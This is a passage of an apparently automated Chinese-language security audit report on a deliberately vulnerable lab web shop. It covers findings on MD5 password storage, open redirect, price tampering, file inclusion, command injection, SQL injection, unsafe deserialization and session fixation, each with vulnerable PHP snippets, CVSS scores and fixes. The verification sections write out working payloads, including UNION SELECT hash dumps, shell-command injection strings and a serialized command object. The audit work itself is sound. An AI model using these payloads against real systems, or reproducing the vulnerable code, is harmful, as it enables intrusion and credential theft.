    4  page('订单详情',function()use($o){echo '<section class="panel"><span class="badge">等待配送</span><h2>'.h($o['order_no']).'</h2><dl>';foreach(['商品'=>$o['name'],'购买人'=>$o['username'],'数量'=>$o['quantity'],'实付金额'=>'¥'.$o['total'],'配送备注'=>$o['private_note']]as$k=>$v)echo '<dt>'.h($k).'</dt><dd>'.h($v).'</dd>';echo '</dl><a class="button secondary" href="/orders/index.php">返回订单中心</a></section>';},'订单中心');
```

`lab30-shop/app/public/orders/index.php:2-2`（sha256 `633f73e04b427bba…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';$u=require_user();$q=db()->prepare('SELECT o.*,p.name FROM orders o LEFT JOIN products p ON p.id=o.product_id WHERE user_id=? ORDER BY o.id DESC');$q->execute([$u['id']]);$orders=$q->fetchAll();
```

`lab30-shop/app/src/bootstrap.php:33-37`（sha256 `2050819d093be02b…`）

```php
   33  function require_user(array $roles = []): array {
   34      $u = user(); if (!$u) fail_request('请先登录后使用此功能。', 401);
   35      if ($roles && !in_array($u['role'], $roles, true)) fail_request('当前账号没有访问该功能的权限。', 403);
   36      return $u;
   37  }
```

### C-11 注册与登录链路口令使用无盐 MD5 弱哈希

- 当前版本：finding `0bed78e56e8045e9bffdfb21970489eb` revision 1（项目版本 1）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/auth/register.php:8`；文件：`lab30-shop/app/public/auth/register.php`
- 证据引用：`97325d351d8189c3` lab30-shop/app/public/auth/register.php:7-8；`bd2a787730066498` lab30-shop/app/src/bootstrap.php:4-7；`1d3eb2d6e3bdc9fc` lab30-shop/app/public/auth/login.php:6-7
- 根因类别：task_goal:v2:82882e39f2babc820f37:1（规范类型 weak_crypto）

**结论陈述（模型产出，不是证据）**

register.php 第 8 行用 md5($password) 生成 password_md5 并写入 users 表；login.php 第 7 行用 md5(输入) 与库中值 hash_equals 比对。全程未使用 password_hash/strong KDF，无盐 MD5 可被离线字典/彩虹表快速还原，且相同口令产生相同摘要。

- 攻击前身份与适用前提：攻击者需先获得 users 表摘要（数据库泄露、备份或其它读取路径）；未发现直接在线爆破限制。
- 入口 → 传播 → 危险操作/状态变更：注册/登录表单 password 字段 → $_POST['password'] -> md5() -> users.password_md5；登录时同样 md5 后 hash_equals 比对。 → 以无盐 MD5 作为口令存储与验证摘要
- 防护与边界：SQL 使用预编译绑定且未模拟预处理，注入面被阻断；但口令摘要无盐、快速、可被 rainbow table 反查，没有 KDF 成本因子。
- 静态判读：证据已记录
- 动态验证：动态确认（verification `ec31bf54dec347149baf8cb08931a283`）
- 正式终审：独立批次 d6beccbf03d149d3b864d51c226c5cf3；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

job 8fabb6017e634a95b88b7e4a9a340a4d（operator，/ops/members.php 正常查询 q=poc41430c 仅返回 id/username/email/role，无摘要；随后 q 改为 UNION SELECT id,username,password_md5,role FROM users-- -，读回全部 users 摘要）：poc41430ca 与 poc41430cb（同为口令 "password"）的 password_md5 均为 5f4dcc3b5aa765d61d8327deb882cf99，poc41430cc（"zzzqwerty9"）为 f18923017775f552d7255b0e076cd04c；既有 alice/bob/operator/admin 摘要分别为 05b8dbe9…、407fd7e7…、fc252aaf…、2637a5c3…，全部为 32 位十六进制裸值，无盐、无 $2y$/$argon 前缀。

- 评分依据：CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：改用 password_hash($password, PASSWORD_ARGON2ID 或 PASSWORD_DEFAULT) 存储，登录用 password_verify；对既有 md5 记录在下次成功登录时迁移并随机加盐。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/auth/register.php:7-8`（sha256 `99166a0288be7b1e…`）

```php
    7      $q=db()->prepare('INSERT INTO users(username,password_md5,display_name,email,role,balance,tier,nickname) VALUES(?,?,?,?,?,100,?,?)');
    8      try {$q->execute([$name,md5($password),$name,(string)($_POST['email']??''),'customer','standard',$name]); $notice='注册成功，现在可以登录。';} catch(PDOException $e) {fail_request('该用户名已注册。',409);}
```

`lab30-shop/app/src/bootstrap.php:4-7`（sha256 `2050819d093be02b…`）

```php
    4  function db(): PDO {
    5      static $pdo;
    6      if (!$pdo) $pdo = new PDO('mysql:host=' . (getenv('DB_HOST') ?: 'db') . ';dbname=' . (getenv('DB_NAME') ?: 'shop') . ';charset=utf8mb4', getenv('DB_USER') ?: 'shop', getenv('DB_PASSWORD') ?: 'shop-local-password', [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC, PDO::ATTR_EMULATE_PREPARES => false]);
    7      return $pdo;
```

`lab30-shop/app/public/auth/login.php:6-7`（sha256 `b9be43ddb2233156…`）

```php
    6      $q=db()->prepare('SELECT id,password_md5 FROM users WHERE username=?'); $q->execute([$_POST['username']??'']); $row=$q->fetch();
    7      if ($row && hash_equals($row['password_md5'],md5((string)($_POST['password']??'')))) {
```

### C-12 continue.php 的 next 参数写入 Location 头导致开放重定向

- 当前版本：finding `9ef964fa5f354f918d4924183aadfe11` revision 1（项目版本 3）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/auth/continue.php:3`；文件：`lab30-shop/app/public/auth/continue.php`
- 证据引用：`a3a2825731fc4c1a` lab30-shop/app/public/auth/continue.php:2-4；`6220461f4c36cb1a` lab30-shop/app/src/bootstrap.php:33-36
- 根因类别：task_goal:v2:1162d75ba7b41d0d90b5:1（规范类型 open_redirect）

**结论陈述（模型产出，不是证据）**

continue.php:2 调用 require_user() 要求已登录；第 3 行直接将 $_GET['next'] 拼入 Location 响应头并 exit，未做协议、主机或相对路径白名单校验。攻击者可构造已登录用户访问的链接，将其重定向至外部站点用于钓鱼或凭据窃取。

- 攻击前身份与适用前提：受害者已登录；攻击者能投递带 next 的链接
- 入口 → 传播 → 危险操作/状态变更：攻击者控制的 HTTP GET 参数 next → GET next -> header Location -> 浏览器重定向至外部站点；require_user 仅校验登录态，不约束跳转目标 → header('Location: '.(string)$_GET['next']) 使用未校验的用户输入
- 防护与边界：无目标白名单、无协议/主机校验；仅 require_user() 认证前提
- 静态判读：证据已记录
- 动态验证：动态确认（verification `02d0e03a2f724f39bc1b5ce3a340bb5a`）
- 正式终审：独立批次 3fd3ef95e01e450cbd343ba846e87695；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

alice 身份 GET /auth/continue.php?next=https%3A%2F%2Fattacker.example%2Fphish：HTTP 302，响应头 location: https://attacker.example/phish（job 7b8d8016f58d4d5c88d6d1b680323b71，exit 0）。外部受控源被原样接受为跳转目标。

- 评分依据：CVSS 3.1 Base 3.5 (low) · CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：校验 next 为相对路径并限制同源主机白名单，拒绝 http/https 外部协议；默认跳转固定页面。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/auth/continue.php:2-4`（sha256 `50fde4a15e52af44…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';require_user();
    3  if(isset($_GET['next'])){header('Location: '.(string)$_GET['next']);exit;}
    4  page('继续访问',function(){echo '<section class="panel"><h2>选择下一站</h2><form method="get">';form_input('next','继续访问地址','/orders/index.php');echo '<button>继续</button></form></section>';});
```

`lab30-shop/app/src/bootstrap.php:33-36`（sha256 `2050819d093be02b…`）

```php
   33  function require_user(array $roles = []): array {
   34      $u = user(); if (!$u) fail_request('请先登录后使用此功能。', 401);
   35      if ($roles && !in_array($u['role'], $roles, true)) fail_request('当前账号没有访问该功能的权限。', 403);
   36      return $u;
```

### C-13 订单创建价格取自客户端 POST，未按服务端商品价格重算导致价格篡改

- 当前版本：finding `0a1bf6e3f513469fa4f9d3cc9bc8af7c` revision 1（项目版本 38）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/orders/create.php:5`；文件：`lab30-shop/app/public/orders/create.php`
- 证据引用：`6d414efca492b76e` lab30-shop/app/public/orders/create.php:3-3；`bcd0fbadcdc153cd` lab30-shop/app/public/orders/create.php:4-4；`e2043780068cc449` lab30-shop/app/public/orders/create.php:5-5；`9e2e81f9a8d2aef6` lab30-shop/app/public/orders/create.php:7-7；`8b236e783043021b` lab30-shop/app/public/orders/detail.php:4-4
- 根因类别：task_goal:v2:c4346d3c498249b2a47f:1（规范类型 price_manipulation）

**结论陈述（模型产出，不是证据）**

create.php 第3行将 $_POST['price'] 转为 $price，第4行只拒绝负数，第5行用客户端 $price 计算 $total，第7行把 $price、$total 直接写入 orders 表。商品记录 $p 已通过 id 查询获得但从未使用 $p['price'] 校验或替换价格，故攻击者可提交任意非负价格（如 0.01 或 0），以远低于标价完成下单与库存扣减。

- 攻击前身份与适用前提：需一个已登录用户账号；需有效 CSRF 令牌（由页面 csrf_field() 正常取得）；目标商品 id 存在且库存足够。
- 入口 → 传播 → 危险操作/状态变更：已登录用户 POST /orders/create.php 的 price 参数 → POST price → $price（第3行）→ $total=$price*$quantity（第5行）→ INSERT orders(unit_price,total)（第7行）→ 订单详情展示实付金额 → 以客户端可控价格写入订单金额并扣减库存
- 防护与边界：仅 FILTER_VALIDATE_FLOAT 类型校验与非负校验，未与服务端 products.price 比对，也无服务端重算。
- 静态判读：缺上下文（1 项）；缺失上下文：未读取支付/退款入口源码（如钱包扣款或支付回调），无法判定是否存在独立于订单创建的重复支付或退款金额篡改问题。
- 动态验证：动态确认（verification `f72d03dc0191487aa1fd88c896699c8c`）
- 正式终审：独立批次 018d854b88194746aff34ba0f75a282f；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

job 6963855d2991492287203027b1f6bfae（alice）：同一商品1，服务端标价仍为 129.00，库存 49；仅将 POST 的 price 改为 0.01，其余 product_id=1&quantity=1 与页面取得的 csrf 不变，返回 303 Location /orders/detail.php?id=4；读回订单4：unit_price="0.01"、total="0.01"；库存扣减为 48。客户端可控价格被接受并写库、扣库存，与正常侧 129.00 形成直接差异。

- 评分依据：CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：服务端应完全忽略客户端提交的 price，改为读取 $p['price'] 计算总价，并在事务内以数据库价格作为唯一结算依据。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/orders/create.php:3-3`（sha256 `41e73625d7e04c58…`）

```php
    3  $q=db()->prepare('SELECT * FROM products WHERE id=?');$q->execute([$_POST['product_id']??0]);$p=$q->fetch();$quantity=filter_var($_POST['quantity']??0,FILTER_VALIDATE_INT);$price=filter_var($_POST['price']??null,FILTER_VALIDATE_FLOAT);
```

`lab30-shop/app/public/orders/create.php:4-4`（sha256 `41e73625d7e04c58…`）

```php
    4  if(!$p||!$quantity||$quantity<1||$quantity>20||$price===false||$price<0)fail_request('商品、数量或价格不正确。');
```

`lab30-shop/app/public/orders/create.php:5-5`（sha256 `41e73625d7e04c58…`）

```php
    5  $total=round($price*$quantity,2);$pdo=db();$pdo->beginTransaction();
```

`lab30-shop/app/public/orders/create.php:7-7`（sha256 `41e73625d7e04c58…`）

```php
    7  $q=$pdo->prepare('INSERT INTO orders(order_no,user_id,product_id,quantity,unit_price,total,private_note) VALUES(?,?,?,?,?,?,?)');$q->execute(['SG-'.bin2hex(random_bytes(5)),$u['id'],$p['id'],$quantity,$price,$total,'会员订单，等待发货']);$id=(int)$pdo->lastInsertId();$pdo->commit();event_log('create_order',['order_id'=>$id,'total'=>$total]);header('Location: /orders/detail.php?id='.$id, true,303);
```

`lab30-shop/app/public/orders/detail.php:4-4`（sha256 `be69aa78cecffcfd…`）

```php
    4  page('订单详情',function()use($o){echo '<section class="panel"><span class="badge">等待配送</span><h2>'.h($o['order_no']).'</h2><dl>';foreach(['商品'=>$o['name'],'购买人'=>$o['username'],'数量'=>$o['quantity'],'实付金额'=>'¥'.$o['total'],'配送备注'=>$o['private_note']]as$k=>$v)echo '<dt>'.h($k).'</dt><dd>'.h($v).'</dd>';echo '</dl><a class="button secondary" href="/orders/index.php">返回订单中心</a></section>';},'订单中心');
```

### C-14 内容中心 page 参数直接拼接进 include 导致本地文件包含

- 当前版本：finding `f6a24603a7a941f3a62f5034c1b46b82` revision 1（项目版本 36）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/content/page.php:3`；文件：`lab30-shop/app/public/content/page.php`
- 证据引用：`be43fce581c2c052` lab30-shop/app/public/content/page.php:2-3；`ede55ccd6753bee7` lab30-shop/app/src/bootstrap.php:3-3
- 根因类别：task_goal:v2:2e83016d51a543fedb0a:1（规范类型 lfi）

**结论陈述（模型产出，不是证据）**

content/page.php 第2行把 $_GET['page'] 强转为字符串后未做任何白名单或路径规范化校验，第3行直接以 APP_ROOT.'/resources/views/'.$name.'.php' 作为 include 操作数。该拼接具有固定本地前缀，属于本地文件包含：攻击者使用 ../ 片段可跳出 views 目录指向任意 .php 文件（含上传目录或含 PHP 代码的文件），一旦被包含即由 PHP 解析执行；即便目标文件的 .php 后缀受拼接约束，仍可包含同服务器上任意以 .php 结尾的可控文件，且包含失败（不存在）会触发异常处理器但存在的路径会执行。

- 攻击前身份与适用前提：无需登录；攻击者可通过 ../ 逃出 views 目录；目标路径须以 .php 结尾且文件存在可被 PHP 解析
- 入口 → 传播 → 危险操作/状态变更：HTTP GET 参数 page → $_GET['page'] → $name → include APP_ROOT.'/resources/views/'.$name.'.php' → include 动态路径
- 防护与边界：无白名单、无 basename、无 realpath 前缀校验；仅有字符串强转
- 静态判读：证据已记录
- 动态验证：动态确认（verification `f2adbc3e59b14e358497e171f812efef`）
- 正式终审：独立批次 018d854b88194746aff34ba0f75a282f；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击（job 2079be416c8a4b09b50f4be547723c17，guest）：GET /content/page.php?page=..%2F..%2Fsrc%2Fbootstrap 返回 200、content-length 688，正文自 <h1>内容中心</h1> 后立即结束，未出现视图内容、商城介绍/配送链接或页脚，响应在 include 调用处终止。该路径从 views 上跳两级即 app/src/bootstrap.php（与 page.php 第 2 行 require 的同一文件），其函数与常量已定义，重复 include 造成致命错误。

- 评分依据：CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：使用固定别名到文件的白名单映射（如 ['home','shipping'] 查表），或 realpath 后校验结果必须位于 APP_ROOT.'/resources/views/' 之内，并拒绝包含目录分隔符与点号。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/content/page.php:2-3`（sha256 `53c5997117f2d54c…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';$name=(string)($_GET['page']??'home');
    3  page('内容中心',function()use($name){include APP_ROOT.'/resources/views/'.$name.'.php';echo '<section class="panel"><a href="?page=home">商城介绍</a> · <a href="?page=shipping">配送与售后</a></section>';},'内容中心');
```

`lab30-shop/app/src/bootstrap.php:3-3`（sha256 `2050819d093be02b…`）

```php
    3  const APP_ROOT = __DIR__ . '/..';
```

### C-15 运营网络诊断将 host 参数拼入 shell_exec 造成系统命令注入

- 当前版本：finding `c02fe17575974cbfa0caf32637b482db` revision 1（项目版本 9）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/ops/ping.php:2`；文件：`lab30-shop/app/public/ops/ping.php`
- 证据引用：`61f200eb89320676` lab30-shop/app/public/ops/ping.php:1-3；`78224482780bf94a` lab30-shop/app/src/bootstrap.php:33-37
- 根因类别：task_goal:v2:1b385ebee8d388e1ca7b:1（规范类型 command_injection）

**结论陈述（模型产出，不是证据）**

ops/ping.php 第2行从 $_GET['host'] 取得字符串，未做任何校验或转义即拼接进 shell_exec('ping -c 1 -W 1 '.$host)，可注入命令分隔符执行任意系统命令。第3行仅对输出做 h() 转义，不能阻止命令执行。该页 require_user(['operator','admin']) 需运营或管理员身份。

- 攻击前身份与适用前提：已登录 operator 或 admin 角色账号
- 入口 → 传播 → 危险操作/状态变更：$_GET['host'] → GET host -> 字符串拼接 -> shell_exec 执行 → shell_exec('ping -c 1 -W 1 '.$host)
- 防护与边界：无输入过滤；仅输出 h() 转义，对命令执行无效
- 静态判读：证据已记录
- 动态验证：动态确认（verification `2d57c9e025e04dcaa6e98b0d3e2576ed`）
- 正式终审：独立批次 018d854b88194746aff34ba0f75a282f；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧作业 b145bcfd011e478ab08bdae2d9d78a29（operator）：把 host 改为 127.0.0.1; printf 'PWNED-CMD-7Q2Z\n'; id; echo HOME=$HOME 后，页面 200，<pre id="diagnostic-output"> 内容先正常 ping 输出，随后出现 'PWNED-CMD-7Q2Z'、'uid=33(www-data) gid=33(www-data) groups=33(www-data)'、'HOME='——这些是 ping 之外的额外命令产生的输出（MARKER_IN_PRE True、UID_IN_PRE True、HOME_IN_PRE True）。表单 value 中的同一字符串是 h() 转义后的回显，与 pre 内的命令执行输出相区分。

- 评分依据：CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：使用 escapeshellarg 或参数数组形式调用，避免拼接；校验 host 为合法主机名/IP。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/ops/ping.php:1-3`（sha256 `c15517950afe0794…`）

```php
    1  <?php
    2  require __DIR__.'/../../src/bootstrap.php';require_user(['operator','admin']);$host=(string)($_GET['host']??'');$output=$host!==''?(string)shell_exec('ping -c 1 -W 1 '.$host):'';
    3  page('网络诊断',function()use($host,$output){echo '<section class="panel"><form method="get">';form_input('host','主机地址',$host?:'127.0.0.1');echo '<button>开始诊断</button></form><pre id="diagnostic-output">'.h($output).'</pre></section>';},'运营工作台');
```

`lab30-shop/app/src/bootstrap.php:33-37`（sha256 `2050819d093be02b…`）

```php
   33  function require_user(array $roles = []): array {
   34      $u = user(); if (!$u) fail_request('请先登录后使用此功能。', 401);
   35      if ($roles && !in_array($u['role'], $roles, true)) fail_request('当前账号没有访问该功能的权限。', 403);
   36      return $u;
   37  }
```

### C-16 商品目录搜索参数 q 拼接进 LIKE 查询导致 SQL 注入

- 当前版本：finding `1895fbd0583d46348f4a8dbd81236b9b` revision 1（项目版本 1）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/catalog/index.php:4`；文件：`lab30-shop/app/public/catalog/index.php`
- 证据引用：`9af2d828eb658d25` lab30-shop/app/public/catalog/index.php:3-4；`c7992617ff9f7621` lab30-shop/app/src/bootstrap.php:4-6
- 根因类别：task_goal:v2:a73391a9c95ac1fb748a:1（规范类型 sqli）

**结论陈述（模型产出，不是证据）**

catalog/index.php 第3行取 $_GET['q']，第4行用双引号字符串直接拼接进 SQL 并交给 db()->query() 执行。bootstrap.php:6 的 db() 虽然设置了 PDO::ATTR_EMULATE_PREPARES=false，但该注入点根本未使用 prepare/占位符，防护不适用。攻击者可通过 q 注入闭合 LIKE 的引号并追加任意 SQL，读取或篡改 products 及同库数据。

- 攻击前身份与适用前提：目标可达 /catalog/index.php 且数据库连接正常；无需登录
- 入口 → 传播 → 危险操作/状态变更：HTTP GET 参数 q → $_GET['q'] -> $term -> "SELECT ... WHERE name LIKE '%".$term."%'" -> PDO::query() -> MySQL → db()->query() 执行拼接了用户输入的 SELECT
- 防护与边界：未使用参数绑定，也未过滤引号/注释符；PDO 模拟预处理关闭对 query() 拼接的 SQL 无保护作用
- 静态判读：缺上下文（1 项）；缺失上下文：未读取所有入口文件，无法确认 check_csrf() 与 require_user() 的覆盖范围
- 动态验证：动态确认（verification `88f50cddcc1640c197e49d4faa4db9be`）
- 正式终审：独立批次 018d854b88194746aff34ba0f75a282f；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

作业 2a093e8f316c4c37ba11361815c0383d（guest，无需登录）：只改 q 参数。q=' UNION SELECT 999,'PWNED-SQLI-7Q2Z','d',1,1,'red'-- - 返回 200，result-count=5，商品 h2 列表为 ['晨光手冲壶','山野帆布包','周末香氛蜡烛','留白手账本','PWNED-SQLI-7Q2Z']，MARKER_AS_PRODUCT_H2 True，注入行描述为 'd'。q=' UNION SELECT 1,username,role,0,0,'red' FROM users WHERE username='alice'-- - 返回 200，结果中出现 <h2>alice</h2> 与 <p>customer</p>（USERS_ALICE_ROW True），即从 users 表读出 username/role。q=' 单独单引号返回 503 错误页（QUOTE_ONLY_STATUS 503），说明引号未过滤并使查询报错。早期作业 431b7b245d44461696630f8202971b29 的 stdout 同样出现 PWNED-SQLI-7Q2Z 注入行，但该作业 exit_code=1 不可用作证据。

- 评分依据：CVSS 3.1 Base 9.4 (critical) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：改用 db()->prepare('SELECT ... FROM products WHERE name LIKE ? ORDER BY id') 并以 '%'.$term.'%' 作为绑定参数传入；对 LIKE 通配符做转义。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/catalog/index.php:3-4`（sha256 `e85bd1c2fa6a4b78…`）

```php
    3  $term=(string)($_GET['q']??'');
    4  $products=db()->query("SELECT id,name,description,price,stock,color FROM products WHERE name LIKE '%".$term."%' ORDER BY id")->fetchAll();
```

`lab30-shop/app/src/bootstrap.php:4-6`（sha256 `2050819d093be02b…`）

```php
    4  function db(): PDO {
    5      static $pdo;
    6      if (!$pdo) $pdo = new PDO('mysql:host=' . (getenv('DB_HOST') ?: 'db') . ';dbname=' . (getenv('DB_NAME') ?: 'shop') . ';charset=utf8mb4', getenv('DB_USER') ?: 'shop', getenv('DB_PASSWORD') ?: 'shop-local-password', [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC, PDO::ATTR_EMULATE_PREPARES => false]);
```

### C-17 ops/jobs.php 对 base64 提交数据 unserialize 触发 DispatchJob::__wakeup 内 shell_exec 造成命令执行

- 当前版本：finding `a41fe4397d1647aca813d15585c09820` revision 1（项目版本 1）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/ops/jobs.php:3`；文件：`lab30-shop/app/public/ops/jobs.php`
- 证据引用：`bc71d05290d8c856` lab30-shop/app/public/ops/jobs.php:2-3；`4a4dd3de59c1de26` lab30-shop/app/src/dispatch_job.php:1-5
- 根因类别：task_goal:v2:14cc77e804933a7712ef:1（规范类型 insecure_deserialization）

**结论陈述（模型产出，不是证据）**

jobs.php 第3行取 $_POST['job'] 做 base64_decode 后直接 unserialize，且在 instanceof 检查之前即已实例化。src/dispatch_job.php 第3-4行 DispatchJob 拥有公有属性 command 与 __wakeup()，方法体执行 shell_exec($this->command)。持有 operator/admin 会话并能取 CSRF 的攻击者提交构造的序列化对象即可执行任意系统命令，输出经 ob_get_clean 写入 jobs.details。

- 攻击前身份与适用前提：需 operator 或 admin 会话；需通过 check_csrf()；DispatchJob 在第2行被 require，无其他依赖。
- 入口 → 传播 → 危险操作/状态变更：已登录 operator/admin 用户提交的 POST 参数 job（base64 编码 PHP 序列化对象） → 第3行 base64_decode($_POST['job']) → unserialize($raw) 触发 DispatchJob::__wakeup() → shell_exec($this->command)；输出经 ob_get_clean 存入 $output 并 INSERT 到 jobs 表。 → 反序列化时 __wakeup 调用 shell_exec 执行攻击者指定的命令。
- 防护与边界：仅 base64 严格模式与 instanceof DispatchJob 检查，均在反序列化之后；无 allowed_classes 限制、无命令白名单。
- 静态判读：证据已记录
- 动态验证：动态确认（verification `64d4749733f947ed9b5391e4d5c9dc76`）
- 正式终审：独立批次 018d854b88194746aff34ba0f75a282f；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

同一 operator 会话、同一表单 csrf、同一端点与序列化结构，仅将 command 改为 printf LAB30DSER_5f3a1c（载荷 O:11:"DispatchJob":1:{s:7:"command";s:23:"printf LAB30DSER_5f3a1c";}）→ POST 200，响应 <pre>LAB30DSER_5f3a1c</pre>；随后 GET /ops/jobs.php 读回 jobs 表新行 id=389，details=LAB30DSER_5f3a1c。该唯一标记只可能来自 shell_exec 执行攻击者提供的命令字符串，而非任何表单正常输出。

- 评分依据：CVSS 3.1 Base 9.9 (critical) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：移除对不可信数据的 unserialize，改用 JSON 且命令走白名单；删除 __wakeup 中的 shell_exec 与公有 command 属性。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/ops/jobs.php:2-3`（sha256 `0f7550fa7f16bd4a…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';require __DIR__.'/../../src/dispatch_job.php';$u=require_user(['operator','admin']);$notice='';$output='';
    3  if($_SERVER['REQUEST_METHOD']==='POST'){check_csrf();$raw=base64_decode((string)($_POST['job']??''),true);if($raw===false)fail_request('任务格式不正确。');ob_start();$job=unserialize($raw);$output=(string)ob_get_clean();if(!$job instanceof DispatchJob)fail_request('不是有效的任务文件。');db()->prepare("INSERT INTO jobs(user_id,title,status,details) VALUES(?,?,'completed',?)")->execute([$u['id'],'导入巡检任务',$output]);$notice='任务已导入并执行。';}
```

`lab30-shop/app/src/dispatch_job.php:1-5`（sha256 `e8234b971fe75d85…`）

```php
    1  <?php
    2  class DispatchJob {
    3      public string $command = 'printf inventory-ready';
    4      public function __wakeup(): void { echo (string)shell_exec($this->command); }
    5  }
```

### C-18 登录入口接受外部 SID 且认证成功后不换发会话，导致会话固定

- 当前版本：finding `8514fe5a09b24a97b2b9200edd85f915` revision 1（项目版本 1）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/auth/login.php:3`；文件：`lab30-shop/app/public/auth/login.php`
- 证据引用：`368b0f4121e7e402` lab30-shop/app/public/auth/login.php:3-3；`daf307afc7aa3b5b` lab30-shop/app/public/auth/login.php:7-9；`96d4fc4a57e8be01` lab30-shop/app/src/bootstrap.php:13-18
- 根因类别：task_goal:v2:00e83c642d69e11eabd7:1（规范类型 session_fixation）

**结论陈述（模型产出，不是证据）**

login.php:3 从 GET 读取 sid 传给 start_session；bootstrap.php:13 关闭 session.use_strict_mode，第 17 行对白名单格式的外部 sid 调用 session_id($sid)，第 18 行启动会话。攻击者可先构造一个已知 SID（16-64 位 [a-zA-Z0-9,-]），诱导受害者使用该 SID 登录；login.php:7 校验通过后第 8 行仅写入 $_SESSION['user_id'] 并在第 9 行跳转，未调用 session_regenerate_id()，受害者会话被固定为攻击者已知 ID，攻击者据此复用已认证会话。

- 攻击前身份与适用前提：攻击者能向受害者投递带 sid 的登录链接；会话存储目录 data_dir()/sessions 可写；受害者完成登录
- 入口 → 传播 → 危险操作/状态变更：攻击者控制的 HTTP GET 参数 sid 与随后受害者提交的登录表单 → GET sid -> start_session($sid) -> session_id($sid) -> session_start() 复用攻击者已知会话；受害者登录后 $_SESSION['user_id'] 写入同一会话，未 regenerate，攻击者以该 SID 获得认证状态 → session_id($sid) 采用外部会话标识且登录成功不换发会话
- 防护与边界：第 17 行仅做字符与长度正则过滤，不阻止合法格式的固定 SID；use_strict_mode=0 允许接受未在服务端存在的会话 ID；登录流程缺失 session_regenerate_id(true)
- 静态判读：证据已记录
- 动态验证：动态确认（verification `11efd0e16a3a495da9de174a041e5cbe`）
- 正式终审：独立批次 3fd3ef95e01e450cbd343ba846e87695；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

受害腿 job bc2d5cd67e7f4738a0a84b304cc07dbc（alice）：GET /auth/login.php?sid=atk95c0451b2d0aec404f64 返回 Set-Cookie SHOPSESSID=atk95c0451b2d0aec404f64，MATCH_ATTACKER True；随后站内提交正常登录表单，VICTIM_LOGIN 200 FINAL http://lab30/，VICTIM_SID_AFTER_LOGIN 仍为该值，ROTATED False，订单页 200 含 SG-1001。攻击者复用 job 87b05ffa618747cb81f3d994490adce8（identity guest，未发送凭据）：仅带 Cookie SHOPSESSID=atk95c0451b2d0aec404f64 请求 /orders/index.php 返回 200，订单号 ['SG-1001']；/wallet/index.php 返回 200，balance 100.00；未知 SID 请求钱包 401。

- 评分依据：CVSS 3.1 Base 6.8 (medium) · CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：登录成功后调用 session_regenerate_id(true)；移除外部落入的 sid 或仅在认证前允许服务端生成的会话；开启 session.use_strict_mode=1。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/auth/login.php:3-3`（sha256 `b9be43ddb2233156…`）

```php
    3  start_session(isset($_GET['sid']) ? (string)$_GET['sid'] : null);
```

`lab30-shop/app/public/auth/login.php:7-9`（sha256 `b9be43ddb2233156…`）

```php
    7      if ($row && hash_equals($row['password_md5'],md5((string)($_POST['password']??'')))) {
    8          $_SESSION['user_id']=(int)$row['id']; event_log('login');
    9          header('Location: /'); exit;
```

`lab30-shop/app/src/bootstrap.php:13-18`（sha256 `2050819d093be02b…`）

```php
   13      ini_set('session.use_strict_mode', '0');
   14      session_save_path(data_dir() . '/sessions');
   15      session_name('SHOPSESSID');
   16      session_set_cookie_params(['httponly' => true, 'samesite' => 'Lax', 'path' => '/']);
